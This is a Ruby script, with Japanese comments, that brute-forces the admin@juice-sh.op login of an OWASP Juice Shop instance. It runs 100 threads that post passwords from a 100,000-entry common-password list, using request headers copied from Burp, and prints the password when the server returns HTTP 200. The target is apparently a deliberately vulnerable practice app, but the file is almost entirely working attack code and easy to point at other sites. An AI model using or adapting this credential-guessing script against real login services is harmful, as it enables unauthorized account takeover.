#!/usr/bin/ruby

require 'net/http'
require 'uri'
require 'kconv'

THREAD_CNT       = 100
SETMSG_FILE_NAME = 'setmsg_juice_shop_login.txt'
PASSWD_FILE_NAME = '10_million_password_list_top_100000.txt'
URL              = 'http://nobus-juice-shop.herokuapp.com'
PORT             = 80
ACTION_URL       = '/rest/user/login'
USER_ID          = 'admin@juice-sh.op'
i_found_it       = false

# 設定ファイルを読み込み、配列で返す
# @param [string] file_name ファイル名
def read_setmsg(file_name)
  strs = []
  begin
    File.open(file_name) do |file|
      file.each_line do |labmen|
        strs << labmen
        #puts labmen
      end
    end
  rescue SystemCallError => e
    puts %Q(class=[#{e.class}] message=[#{e.message}])
  rescue IOError => e
    puts %Q(class=[#{e.class}] message=[#{e.message}])
  end
  return strs
end

# 設定ファイルを読み込みリクエストヘッダーに設定する
# @param [Net::HTTP::Post] req リクエストヘッダー
# @param [arry] setmsgs 設定ファイル
def setRequestHead(req, setmsgs, body_msg)
  setmsgs.each do |msg|
    if msg.index('POST') == nil then
      elements = msg.split(":")
      key = ''
      val = ''
      cnt = 0
      if elements[0].strip.length != 0 then
        elements.each do |aaa|
          if cnt == 0 then
            key = aaa
          else
            val = val + aaa
          end
          cnt += 1
        end
        if key == 'Content-Length' then
          req[key] = body_msg.strip.length
        else
          req[key] = val.strip
        end
      end
    end
  end
end

uri  = URI.parse(URL)

# 設定ファイルの値を取得する
setmsgs = read_setmsg(SETMSG_FILE_NAME)

# パスワードファイルの読み込み
# passwd = ['KN500630','kn450220','admin123']
passwd = read_setmsg(PASSWD_FILE_NAME)

# スレッド個数から1スレッドで検証するべきパスワードの件数を算出する
max_passwd_row = passwd.length
one_thread_cnt = max_passwd_row / THREAD_CNT
remainder_cnt  = max_passwd_row % THREAD_CNT

puts 'スレッドでの処理を開始'
thread = []
(1..THREAD_CNT).each do |i|
  thread << Thread.new do
    # ホスト接続
    http = Net::HTTP.new(uri.host, PORT)

    # HTTP ヘッダの設定(Burpで入手したヘッダーの値をそのまま記述(クッキーだけは上記で取得したの))
    req = Net::HTTP::Post.new(ACTION_URL)

    start_index = (i * one_thread_cnt) - one_thread_cnt
    end_index   = i * one_thread_cnt
    roop_count = start_index
    passwd[start_index..end_index].each do |pass|
      roop_count += 1

      # POST boty を設定する
      req.body = '{"email":"admin@juice-sh.op","password":"'+pass.strip+'"}'

      # 設定ファイルを読み込みリクエストヘッダーに設定する
      setRequestHead(req, setmsgs, req.body)

      #if i == 1 then
      #  req.each do |name,value|
      #    puts name + ' : ' + value
      #  end
      #  puts "req.body -> #{req.body}"
      #end
      # 接続
      if i_found_it == true then
        puts "すでに見つかったようなので、接続を終了します。 connection_no: #{i} roop_count: #{roop_count}"
        break
      end
      begin
        res = http.request(req)

        if roop_count == start_index + 5 then
          puts "thread#{i} -> Succeeded first connection"
        end
        # 戻り値の検証を行う
        if i_found_it == false then
          if res.code == '401' then
            if roop_count % 100 == 0 then
              puts "thread#{i} -> #{roop_count}"
            end
          elsif res.code == '200' then
            puts "見つけました。 connection_no: #{i} roop_count: #{roop_count}"
            puts "code msg -> #{res.code} #{res.message}"
            #puts "body -> #{Kconv.tosjis(res.body)}"
            puts "password -> #{pass.strip}"
            i_found_it = true
            break
          end
        end
      rescue => e
        #puts e.message
        #puts e.class
        puts "接続に失敗しました！ connection_no: #{i} roop_count: #{roop_count} password: #{pass.strip}"
      end
    end
  end
end
thread.each do |th_red|
  th_red.join
end
puts 'サブスレッドが終わったのでメインスレッドを終了します'
